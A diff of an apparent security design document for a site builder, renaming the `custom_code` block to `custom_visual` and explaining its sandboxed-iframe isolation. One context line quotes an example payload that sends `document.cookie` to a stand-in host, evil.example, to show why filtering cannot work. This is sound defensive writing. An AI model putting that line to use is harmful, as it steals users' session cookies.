@@ -22,7 +22,7 @@ inputs an attacker can choose.
 | Text section `content` | builder, AI | `HtmlContent` → `dangerouslySetInnerHTML` | **Yes** - `text` profile |
 | Catalogue `heading` | builder, AI | `HtmlContent` | **Yes** - `text` profile |
 | `embedding` block `code` | builder, AI | `HtmlContent` | **Yes** - `embed` profile |
-| `custom_code` block `code` | builder, AI | sandboxed iframe, opaque origin | **Isolated**, not filtered |
+| `custom_visual` block `code` | builder, AI | sandboxed iframe, opaque origin | **Isolated**, not filtered |
 
 ### The three that are filtered
 
@@ -54,7 +54,7 @@ equally unfiltered sink.
 
 ### The one that is isolated instead
 
-`custom_code` does not go through `HtmlContent` and is not filtered at all. It
+`custom_visual` does not go through `HtmlContent` and is not filtered at all. It
 is arbitrary HTML, CSS and JavaScript, and running it is the feature -
 interactive widgets, games, calculators.
 
@@ -67,7 +67,7 @@ new Image().src = "https://evil.example/?c=" + document.cookie;
 ```
 
 There is no filter over JavaScript source that fixes this while still letting
-widgets run. So the control is isolation. `CustomCode.tsx` renders the fragment
+widgets run. So the control is isolation. `CustomVisual.tsx` renders the fragment
 into an iframe as `sandbox="allow-scripts"` **without** `allow-same-origin`,
 which gives it an opaque origin.
 
